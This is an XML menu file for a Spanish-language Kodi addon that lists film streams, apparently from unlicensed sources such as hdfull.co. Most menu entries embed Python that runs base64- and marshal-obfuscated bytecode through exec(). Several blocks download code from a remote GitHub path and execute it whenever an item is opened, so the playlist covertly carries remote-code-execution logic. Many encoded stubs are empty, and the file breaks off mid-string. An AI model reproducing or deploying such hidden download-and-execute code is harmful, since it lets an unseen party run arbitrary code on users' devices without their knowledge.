<?xml version="1.0" encoding="UTF-8" standalone="yes"?>


<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Buscador [COLOR white]Pidepalomitas[/COLOR]</title>
<link>$doregex[makelist2]</link>
<regex>
<name>makelist2</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</title>
<info>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</info>
<link>$doregex[link_final]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil,random,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final</name>
<listrepeat><![CDATA[
<title>[COLOR white][link_final.param2] [link_final.param3] [link_final.param4] [/COLOR]</title>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,random,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final_total</name>
<expres><![CDATA[#$pyFunction
url = '[link_final.param1]'
referer = '[makelist2.param3]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,random,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[link_final_total]'
$doregex[importar]
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data,Cookie_Jar,m):
    import urllib2
    return urllib2.urlopen('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/conector.a.distancia.definitivo').read()
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNRQUFBQVlBQUFCREFBQUFjODBBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0I4QndCcUJRQ0RBQUJxQmdCa0FnQ0RBUUI5Q0FCa0F3QjhDQUJyQmdCemRRQmtCQUI4Q0FCckJnQnpkUUJrQlFCOENBQnJCZ0J5bndCOEJBQnFCd0JrQmdCa0J3QnBBZ0JrQ0FCa0NRQTJaQW9BWkFzQU5tUU1BSFFJQUlNQkFtb0pBRk44QkFCcUJ3QmtEUUJrQndCcEFnQmtDQUJrQ1FBMlpBb0FaQXNBTm1RTUFIUUlBSU1CQW1vSkFGTmtBQUJUS0E0QUFBQk9hZi8vLy85MEFnQUFBR2xrZEFzQUFBQmpjbWx6ZEdGc1lYcDFiSFFGQUFBQVptVnpkR0YwQ0FBQUFFWjFjMmx2YmxSMmMyWUFBQUJvZEhSd2N6b3ZMM0poZHk1bmFYUm9kV0oxYzJWeVkyOXVkR1Z1ZEM1amIyMHZRM0pwYzNSaGJHRjZkV3d2UTNKcGMzUmhiR0Y2ZFd3dWFXOHZiV0ZwYmk5RFQwNUZRMVJQVWtWVEwwbHRjRzl5ZEdGeUxtVnVkR1Z5Ynk1a2FYTjBZVzVrYVdGMEJ3QUFBR2hsWVdSbGNuTnpTQUFBQUUxdmVtbHNiR0V2TlM0d0lDaFhhVzVrYjNkeklFNVVJRFl1TXpzZ1YwOVhOalE3SUhKMk9qVTFMakFwSUVkbFkydHZMekl3TVRBd01UQXhJRVpwY21WbWIzZ3ZOVFV1TUhNS0FBQUFWWE5sY2kxQloyVnVkSE1TQUFBQWFIUjBjSE02THk5bmFYUm9kV0l1WTI5dGRBY0FBQUJTWldabGNtVnlkQVlBQUFCMlpYSnBabmx6WEFBQUFHaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5RGNtbHpkR0ZzWVhwMWJDOURjbWx6ZEdGc1lYcDFiQzVwYnk5dFlXbHVMME5QVGtWRFZFOVNSVk12YVcxd2IzSjBZWEl1Y205aVlXUnZLQW9BQUFCMEFnQUFBSEpsZEFnQUFBQnlaWEYxWlhOMGMzUUNBQUFBYjNOMEJBQUFBSGhpYldOMENRQUFBSGhpYldOaFpHUnZiblFGQUFBQVFXUmtiMjUwREFBQUFHZGxkRUZrWkc5dVNXNW1iM1FEQUFBQVoyVjBkQVVBQUFCR1lXeHpaWFFFQUFBQWRHVjRkQ2dKQUFBQWRBa0FBQUJ3WVdkbFgyUmhkR0YwQ2dBQUFFTnZiMnRwWlY5S1lYSjBBUUFBQUcxU0J3QUFBRklJQUFBQVVna0FBQUJTQ2dBQUFGSUxBQUFBVWdBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwREFBQUFFZGxkRXhUVUhKdlJHRjBZUUVBQUFCekNnQUFBQUFCUEFFVkFTUUJLZ0pPS0FFQUFBQlNGQUFBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/r6aXooD.jpg</thumbnail>
<fanart>https://i.imgur.com/gPpqFAT.jpg</fanart>
</item>
-----------------------------------------------------------------------------------------------------------------------
<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Cine [COLOR white]Super Estrenos[/COLOR]</title>  
<link>$doregex[c]</link>
<regex>
<name>c</name>
<listrepeat><![CDATA[
<title>[c.param1]</title>
<genre>[c.param2]</genre>
<year>[c.param3]</year>
<info>[c.param6]</info>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[c.param4]</thumbnail>
<fanart>[c.param5]</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,xbmc,xbmcaddon,xbmcgui,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>multi</name>
<expres><![CDATA[#$pyFunction
url = '[c.param7]'
title = '[c.param1]'
import xbmc,xbmcaddon,xbmcgui,re,json
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[multi]'
$doregex[importar]
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]
]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data,Cookie_Jar,m):
    import urllib2
    return urllib2.urlopen('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/conector.a.distancia.definitivo').read()
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNRQUFBQVlBQUFCREFBQUFjODBBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0I4QndCcUJRQ0RBQUJxQmdCa0FnQ0RBUUI5Q0FCa0F3QjhDQUJyQmdCemRRQmtCQUI4Q0FCckJnQnpkUUJrQlFCOENBQnJCZ0J5bndCOEJBQnFCd0JrQmdCa0J3QnBBZ0JrQ0FCa0NRQTJaQW9BWkFzQU5tUU1BSFFJQUlNQkFtb0pBRk44QkFCcUJ3QmtEUUJrQndCcEFnQmtDQUJrQ1FBMlpBb0FaQXNBTm1RTUFIUUlBSU1CQW1vSkFGTmtBQUJUS0E0QUFBQk9hZi8vLy85MEFnQUFBR2xrZEFzQUFBQmpjbWx6ZEdGc1lYcDFiSFFGQUFBQVptVnpkR0YwQ0FBQUFFWjFjMmx2YmxSMmMyWUFBQUJvZEhSd2N6b3ZMM0poZHk1bmFYUm9kV0oxYzJWeVkyOXVkR1Z1ZEM1amIyMHZRM0pwYzNSaGJHRjZkV3d2UTNKcGMzUmhiR0Y2ZFd3dWFXOHZiV0ZwYmk5RFQwNUZRMVJQVWtWVEwwbHRjRzl5ZEdGeUxtVnVkR1Z5Ynk1a2FYTjBZVzVrYVdGMEJ3QUFBR2hsWVdSbGNuTnpTQUFBQUUxdmVtbHNiR0V2TlM0d0lDaFhhVzVrYjNkeklFNVVJRFl1TXpzZ1YwOVhOalE3SUhKMk9qVTFMakFwSUVkbFkydHZMekl3TVRBd01UQXhJRVpwY21WbWIzZ3ZOVFV1TUhNS0FBQUFWWE5sY2kxQloyVnVkSE1TQUFBQWFIUjBjSE02THk5bmFYUm9kV0l1WTI5dGRBY0FBQUJTWldabGNtVnlkQVlBQUFCMlpYSnBabmx6WEFBQUFHaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5RGNtbHpkR0ZzWVhwMWJDOURjbWx6ZEdGc1lYcDFiQzVwYnk5dFlXbHVMME5QVGtWRFZFOVNSVk12YVcxd2IzSjBZWEl1Y205aVlXUnZLQW9BQUFCMEFnQUFBSEpsZEFnQUFBQnlaWEYxWlhOMGMzUUNBQUFBYjNOMEJBQUFBSGhpYldOMENRQUFBSGhpYldOaFpHUnZiblFGQUFBQVFXUmtiMjUwREFBQUFHZGxkRUZrWkc5dVNXNW1iM1FEQUFBQVoyVjBkQVVBQUFCR1lXeHpaWFFFQUFBQWRHVjRkQ2dKQUFBQWRBa0FBQUJ3WVdkbFgyUmhkR0YwQ2dBQUFFTnZiMnRwWlY5S1lYSjBBUUFBQUcxU0J3QUFBRklJQUFBQVVna0FBQUJTQ2dBQUFGSUxBQUFBVWdBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwREFBQUFFZGxkRXhUVUhKdlJHRjBZUUVBQUFCekNnQUFBQUFCUEFFVkFTUUJLZ0pPS0FFQUFBQlNGQUFBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/672TtdH.jpg</thumbnail>
<fanart>https://i.imgur.com/gPpqFAT.jpg</fanart>
</item>
-------------------------------------------------------------------------------------------------------------------------------------------------------
<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Cine [/COLOR][COLOR white]Hd[/COLOR] </title>
<link>$doregex[A]</link>
<regex>
<name>A</name>
<listrepeat><![CDATA[
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Cine Hd [COLOR white][A.param1] [/COLOR]</title>
<thumbnail>https://i.imgur.com/Aqhr7Ig.jpg</thumbnail>
<fanart>http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png</fanart>
<link>$doregex[makelist2]</link>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data, Cookie_Jar, m):
    items = [('Buscador', 'search', ''), ('Estrenos', 'estrenos', ''), ('Ranking Imdb', 'ranking', ''), ('Genero', 'genero', '')]
    return items
]]></expres>
<page></page>
<agent></agent>
</regex>
<regex>
<name>makelist2</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist2.param6] [COLOR aqua](*[makelist2.param3][makelist2.param4])[/COLOR]</title>
<info>[COLOR white][CAPITALIZE][makelist2.param6][/CAPITALIZE][/COLOR]</info>
<link>$doregex[peli]</link>
<thumbnail>https://hdfull.co[makelist2.param1]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
elegir = '[A.param2]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>peli</name>
<listrepeat><![CDATA[
<title>$pyFunction:("[COLOR white][CAPITALIZE][peli.param4] [peli.param2] [peli.param3][/CAPITALIZE][/COLOR]").replace("https://","").replace("http://","")</title>
<link>$doregex[selecion_inteligente]</link>
<info>[COLOR white][CAPITALIZE][peli.param2] [peli.param3][/CAPITALIZE][/COLOR]</info>
<thumbnail>https://hdfull.co[makelist2.param1]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param5]'
import re,requests,base64,xbmc,xbmcaddon,json,xbmcgui,urllib2
$doregex[finalhdfull]
]]></expres>
<page></page>
</regex>
<regex>
<name>finalhdfull</name>
<expres><![CDATA[#$pyFunction
import re,requests,base64,xbmc,xbmcaddon,json,xbmcgui,urllib2
def GetLSProData(page_data, Cookie_Jar, m):

  return re.split('\n*?', urllib2.urlopen('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/dominios/finalhdfull').read())[0]

]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '[peli.param1]'
$doregex[importar]
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data,Cookie_Jar,m):
    import urllib2
    return urllib2.urlopen('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/conector.a.distancia.definitivo').read()
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNRQUFBQVlBQUFCREFBQUFjODBBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0I4QndCcUJRQ0RBQUJxQmdCa0FnQ0RBUUI5Q0FCa0F3QjhDQUJyQmdCemRRQmtCQUI4Q0FCckJnQnpkUUJrQlFCOENBQnJCZ0J5bndCOEJBQnFCd0JrQmdCa0J3QnBBZ0JrQ0FCa0NRQTJaQW9BWkFzQU5tUU1BSFFJQUlNQkFtb0pBRk44QkFCcUJ3QmtEUUJrQndCcEFnQmtDQUJrQ1FBMlpBb0FaQXNBTm1RTUFIUUlBSU1CQW1vSkFGTmtBQUJUS0E0QUFBQk9hZi8vLy85MEFnQUFBR2xrZEFzQUFBQmpjbWx6ZEdGc1lYcDFiSFFGQUFBQVptVnpkR0YwQ0FBQUFFWjFjMmx2YmxSMmMyWUFBQUJvZEhSd2N6b3ZMM0poZHk1bmFYUm9kV0oxYzJWeVkyOXVkR1Z1ZEM1amIyMHZRM0pwYzNSaGJHRjZkV3d2UTNKcGMzUmhiR0Y2ZFd3dWFXOHZiV0ZwYmk5RFQwNUZRMVJQVWtWVEwwbHRjRzl5ZEdGeUxtVnVkR1Z5Ynk1a2FYTjBZVzVrYVdGMEJ3QUFBR2hsWVdSbGNuTnpTQUFBQUUxdmVtbHNiR0V2TlM0d0lDaFhhVzVrYjNkeklFNVVJRFl1TXpzZ1YwOVhOalE3SUhKMk9qVTFMakFwSUVkbFkydHZMekl3TVRBd01UQXhJRVpwY21WbWIzZ3ZOVFV1TUhNS0FBQUFWWE5sY2kxQloyVnVkSE1TQUFBQWFIUjBjSE02THk5bmFYUm9kV0l1WTI5dGRBY0FBQUJTWldabGNtVnlkQVlBQUFCMlpYSnBabmx6WEFBQUFHaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5RGNtbHpkR0ZzWVhwMWJDOURjbWx6ZEdGc1lYcDFiQzVwYnk5dFlXbHVMME5QVGtWRFZFOVNSVk12YVcxd2IzSjBZWEl1Y205aVlXUnZLQW9BQUFCMEFnQUFBSEpsZEFnQUFBQnlaWEYxWlhOMGMzUUNBQUFBYjNOMEJBQUFBSGhpYldOMENRQUFBSGhpYldOaFpHUnZiblFGQUFBQVFXUmtiMjUwREFBQUFHZGxkRUZrWkc5dVNXNW1iM1FEQUFBQVoyVjBkQVVBQUFCR1lXeHpaWFFFQUFBQWRHVjRkQ2dKQUFBQWRBa0FBQUJ3WVdkbFgyUmhkR0YwQ2dBQUFFTnZiMnRwWlY5S1lYSjBBUUFBQUcxU0J3QUFBRklJQUFBQVVna0FBQUJTQ2dBQUFGSUxBQUFBVWdBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwREFBQUFFZGxkRXhUVUhKdlJHRjBZUUVBQUFCekNnQUFBQUFCUEFFVkFTUUJLZ0pPS0FFQUFBQlNGQUFBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/cpjS2JT.jpg</thumbnail>
<fanart>https://i.imgur.com/gPpqFAT.jpg</fanart>
</item>
-----------------------------------------------------------------------------------------------------------------------------------------------------------------
<!--
<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Supercine [COLOR white]Cristal[/COLOR]</title>
<link>$doregex[A]</link>
<regex>
<name>A</name>
<listrepeat><![CDATA[
<title>[COLOR gold]*[COLOR lightsalmon]Supercine [COLOR white][A.param1] [/COLOR]</title>
<thumbnail>https://i.imgur.com/m6YPUYA.jpg</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
<link>$doregex[busca]</link>
]]></listrepeat>
<expres><![CDATA[#$pyFunction


import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
<agent></agent>
</regex>
<regex>
<name>busca</name>
<listrepeat><![CDATA[
<title>[COLOR white][busca.param3]  [COLOR gold][busca.param4][/COLOR]</title>
<link>$doregex[peli]</link>
<thumbnail>[busca.param2]<thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
elegir = '[A.param2]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>peli</name>
<listrepeat><![CDATA[
<title>[COLOR white][peli.param2]  [COLOR gold][peli.param5][COLOR orange]  [peli.param3][/COLOR]</title>
 <link>$doregex[selecion_inteligente]</link>
<info>[peli.param6]</info>
<thumbnail>[busca.param2]<thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url='[busca.param1]'
import re,requests,base64,xbmc,xbmcaddon
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final</name>
<expres><![CDATA[#$pyFunction
servidores='[peli.param4]'
referer='[busca.param1]'
import re,requests
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[link_final]'
$doregex[importar]
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data,Cookie_Jar,m):
    import urllib2
    return urllib2.urlopen('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/conector.a.distancia.definitivo').read()
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNRQUFBQVlBQUFCREFBQUFjODBBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0I4QndCcUJRQ0RBQUJxQmdCa0FnQ0RBUUI5Q0FCa0F3QjhDQUJyQmdCemRRQmtCQUI4Q0FCckJnQnpkUUJrQlFCOENBQnJCZ0J5bndCOEJBQnFCd0JrQmdCa0J3QnBBZ0JrQ0FCa0NRQTJaQW9BWkFzQU5tUU1BSFFJQUlNQkFtb0pBRk44QkFCcUJ3QmtEUUJrQndCcEFnQmtDQUJrQ1FBMlpBb0FaQXNBTm1RTUFIUUlBSU1CQW1vSkFGTmtBQUJUS0E0QUFBQk9hZi8vLy85MEFnQUFBR2xrZEFzQUFBQmpjbWx6ZEdGc1lYcDFiSFFGQUFBQVptVnpkR0YwQ0FBQUFFWjFjMmx2YmxSMmMyWUFBQUJvZEhSd2N6b3ZMM0poZHk1bmFYUm9kV0oxYzJWeVkyOXVkR1Z1ZEM1amIyMHZRM0pwYzNSaGJHRjZkV3d2UTNKcGMzUmhiR0Y2ZFd3dWFXOHZiV0ZwYmk5RFQwNUZRMVJQVWtWVEwwbHRjRzl5ZEdGeUxtVnVkR1Z5Ynk1a2FYTjBZVzVrYVdGMEJ3QUFBR2hsWVdSbGNuTnpTQUFBQUUxdmVtbHNiR0V2TlM0d0lDaFhhVzVrYjNkeklFNVVJRFl1TXpzZ1YwOVhOalE3SUhKMk9qVTFMakFwSUVkbFkydHZMekl3TVRBd01UQXhJRVpwY21WbWIzZ3ZOVFV1TUhNS0FBQUFWWE5sY2kxQloyVnVkSE1TQUFBQWFIUjBjSE02THk5bmFYUm9kV0l1WTI5dGRBY0FBQUJTWldabGNtVnlkQVlBQUFCMlpYSnBabmx6WEFBQUFHaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5RGNtbHpkR0ZzWVhwMWJDOURjbWx6ZEdGc1lYcDFiQzVwYnk5dFlXbHVMME5QVGtWRFZFOVNSVk12YVcxd2IzSjBZWEl1Y205aVlXUnZLQW9BQUFCMEFnQUFBSEpsZEFnQUFBQnlaWEYxWlhOMGMzUUNBQUFBYjNOMEJBQUFBSGhpYldOMENRQUFBSGhpYldOaFpHUnZiblFGQUFBQVFXUmtiMjUwREFBQUFHZGxkRUZrWkc5dVNXNW1iM1FEQUFBQVoyVjBkQVVBQUFCR1lXeHpaWFFFQUFBQWRHVjRkQ2dKQUFBQWRBa0FBQUJ3WVdkbFgyUmhkR0YwQ2dBQUFFTnZiMnRwWlY5S1lYSjBBUUFBQUcxU0J3QUFBRklJQUFBQVVna0FBQUJTQ2dBQUFGSUxBQUFBVWdBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwREFBQUFFZGxkRXhUVUhKdlJHRjBZUUVBQUFCekNnQUFBQUFCUEFFVkFTUUJLZ0pPS0FFQUFBQlNGQUFBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/hEKykpy.jpg</thumbnail>
<fanart>https://i.imgur.com/gPpqFAT.jpg</fanart>
</item>
-->
-------------------------------------------------------------------------------------------------------------------------------------------------------------------

<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Supercine [COLOR white] Cristal[/COLOR]</title> 
<link>http://ignorame</link>
<externallink>https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CINE/Nuevo.supercine.enc/menu.supercine.txt</externallink>
<thumbnail>https://i.imgur.com/vTy5Olu.jpg</thumbnail>
<fanart>https://i.imgur.com/gPpqFAT.jpg</fanart>
</item>
direct link
-------------------------------------------------------------------------------------------------------------------------------------------
<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Supercine [COLOR white] Por Productoras[/COLOR]</title>
<link>$doregex[makelist]</link>
<regex>
<name>makelist</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist.param1][/COLOR]</title>
<link>$doregex[makelist2]</link>
<thumbnail>[makelist.param3]</thumbnail>
<fanart>http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
from datetime import datetime, timedelta
import re,requests,urllib2,xbmc,time
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUJRQUFBRUFBQUFCemlRQUFBR1FBQUdRQkFHd0FBRm9BQUdRQUFHUUJBR3dCQUZvQkFHUUNBRm9DQUdRREFGb0RBR1FFQUZvRUFHUUZBRm9GQUdRR0FGb0dBR1VIQUdRSEFJTUJBR1VIQUdRSUFJTUJBQmRsQndCa0NRQ0RBUUFYWlFjQVpBb0Fnd0VBRjFvSUFHVUhBR1VKQUdVQUFHb0tBR1VIQUdRTEFJTUJBSU1CQUdRTUFHUU5BSU1EQUlNQkFBRmtBUUJUS0E0QUFBQnAvLy8vLzA1MDBRd0FBRWw1UW14aWJVNTJXa2RXYTBsSFNqVkVVVzlxU1VWYVZWSjNNRXRFVVhCd1lsaENkbU51VVdkWmJVWjZXbFJaTUV4RFFqWmlSMnhwVEVOQ2FtSXlVbXhaTTAxelNVZEtjR0p0Um5wWk1teHdSRkZ3ZEdJelNuZGhSMVl4WTNsQk9VbERZekpPVkZKb1RucHJNMDVFVlROT2FsRXpUbFJTYlU1dFdYcFBSRmsxVGxSak1rNXFWWHBOYlVrelRVUktiVTU2UlRCT2VscHBUWHBuZWsxVVVUQk9hbEV3V21wamVFMTZRVEZOYWxFeVRqSkZNMDVFVlhkT1ZHTjZUbFJhYlU1cVZUQlphbFV5VGpKRk1rMTZWVEJPYWxVd1RWUlJNVTVxWXpOWlZGRXpUbTFaTVU5RVRYbE9Na1V3V1dwTk1rNVVVVEZOVkZWNFRrUmpNRTVxWXpSTmVra3lUWHBqTWs1dFZYcE9hbU42VFhwTk1VOVVUVEJPZWtWNVdtcGplRTVxYXpKYWFrMDFUa1JWZWs5RVdtaE9SRlV5V21wVk0wNUVZekZPVkZVd1RrUlZNbGxVV214TmVra3hUVVJqTUU1cVJUSlBSRXB0VG1wWk1FNUVXbTFOZWtrelQwUlpNVTVVWnpOTmFrMDBUbXBWTTA1VVdteE9lbU41V21wYWFFNTZaek5PZW1Sb1RYcG5lVmxxVlROT2Fra3dUMFJOTlUxNlp6Sk5lbFYzVGtSbk1FNUVUWGxPYWxreFRXcFZORTU2UlhwT2FrMTZUbFJSZWs1RVdUSk5lbXN6VGtSS2FVNVVRVEZPUkUwelRrZEZNazVFVlhkT2VsRXdXV3BTYWsxNlVYcFBWR015VGtSak1FNUVZekZPUkZreldWUlplVTE2UlhsWmFsVjNUWHByZWsxcVRUSk9hbGt5VG1wVmQwNXRWWHBOVkUxNVRucG5lazFxVlRKTmVtc3dUbFJTYTA1RVdUSk5hbGw1VG0xUmVrOUVZM2xOZWtWNVdtcFplVTV0VVRGTmFscHNUbXBqTTAxRVZUUk9WRkV3V2xSVmQwNXRXVEpaZWsweFRsZEZNRTU2VlROT1JHY3lUV3BSTkU1dFZUSk5hbEpxVG5wUmVrNXFVVFZPUjBVeFRrUk5NVTV0VVROT2VtTjNUbTFGTTFsVVVtMU9SRmt4VFVSS2JVNUhUWHBQUkdNeFRtMU5NazU2VFhoTmVra3lUWHBOTkU1NmEzcE9SRkpyVGxSamVrMVVWbWhPYlZVd1dtcGpNazE2U1RCT2Fsa3lUbXBWZWs5RVVYbE5lbWN6VFVSak1FNVVWVE5PUkUwMVRucFJNMDU2VW0xT2VsVXpUa1JaTWs1NldYcE9lbGw0VFhwRk1rMVVXbWhPUkdNeldWUlpORTVxV1RKUFZGcHJUWHBCTUU5VVVUVk5lbFV5VGxSWk0wMTZXVEphVkZWNlRrUkZNMDlVVlhkT1ZFbDVXV3BSTTA1VVVUSlBWRlV6VG1wVk1FMVVWbWhPYWtVeVdYcGFhMDVYUlRKUFZHTTFUa1JSTWxwRVZUTk9iVmt3VFZSYWJFNXRWWHBOUkUwd1RsUlJNRnBVWkdoT2Vtc3dUV3BaTUU1cVRUTk5hbGw0VGxSTk1GbHFXWGhPYW1NelRVUlNhazVVWnpGWlZGVjNUa2ROTUUxcVVUQk9WRUV4VDFSak1rNHlSVEJaYWxrMFRrUk5NbHBFV21wT2JVbDZUV3BaTkU0eVJUTk5WRmt3VGtSVk